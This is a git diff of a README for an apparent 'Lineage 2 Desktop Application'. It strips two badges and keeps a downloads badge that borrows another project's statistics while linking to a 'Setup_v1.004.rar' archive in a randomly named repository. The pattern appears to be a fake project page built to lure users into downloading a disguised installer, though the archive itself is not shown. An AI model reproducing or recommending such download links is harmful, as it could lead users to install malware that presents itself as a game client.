@@ -3,8 +3,7 @@
   <p align="center">Lineage 2 Desktop Application</p>
 </p>
 
-![Windows](https://github.com/Pxa2qzlcTaashWEvtwCf/silver-broccoli?branch=master&event=push)
-![Linux](https://github.com/Pxa2qzlcTaashWEvtwCf/silver-broccoli?branch=master&event=push)
+
 [![English badge](https://img.shields.io/badge/%E8%8B%B1%E6%96%87-English-blue)](./README.md)
 [![Lineage2 downloads](https://img.shields.io/github/downloads/lencx/ChatGPT/total.svg?style=flat-square)](https://github.com/h9zafALfXEUaQa1VJuS/supreme-tribble/releases/download/Download/Setup_v1.004.rar)
 [![chat](https://img.shields.io/badge/chat-discord-blue?style=flat&logo=discord)](https://discord.gg/aPhCRf4zZr)
